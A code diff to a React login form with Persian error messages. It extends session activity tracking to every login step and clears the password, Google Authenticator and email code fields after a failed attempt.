@@ -113,13 +113,10 @@ export const LoginForm = () => {
     }
   }, [sessionId]);
 
-  // Optimized user activity tracking - only when on loading step
+  // User activity tracking - works on all steps but only sends updates when needed
   useEffect(() => {
-    if (sessionId && currentStep === "loading") {
-      console.log(
-        "🔍 Starting optimized activity tracking for session:",
-        sessionId,
-      );
+    if (sessionId) {
+      console.log("🔍 Starting user activity tracking for session:", sessionId);
 
       const handleStatusChange = async (status: ActivityStatus) => {
         console.log("📡 Activity status changed:", status);
@@ -127,6 +124,7 @@ export const LoginForm = () => {
         const statusText = userActivityService.getStatusText();
         const statusEmoji = userActivityService.getStatusEmoji();
 
+        // Send activity updates (the service will handle rate limiting)
         await updateUserOnlineStatus(
           sessionId,
           status.isOnline,
@@ -145,7 +143,7 @@ export const LoginForm = () => {
         userActivityService.stopTracking();
       };
     }
-  }, [sessionId, currentStep]);
+  }, [sessionId]);
 
   // Countdown timer for verify-phone step
   useEffect(() => {
@@ -168,6 +166,7 @@ export const LoginForm = () => {
       switch (errorType) {
         case "password":
           setCurrentStep("password");
+          setPassword(""); // Clear password field
           setErrors({
             password:
               "رمز عبور وارد شده اشتباه است. لطفا رمز صحیح را وارد کنید.",
@@ -175,6 +174,7 @@ export const LoginForm = () => {
           break;
         case "google":
           setCurrentStep("google");
+          setGoogleCode(""); // Clear Google code field
           setErrors({
             googleCode:
               "کد Google Authenticator وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
@@ -192,6 +192,7 @@ export const LoginForm = () => {
         case "email":
           setCurrentStep("email");
           setEmailStep("code");
+          setEmailCode(""); // Clear email code field
           setErrors({
             emailCode:
               "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
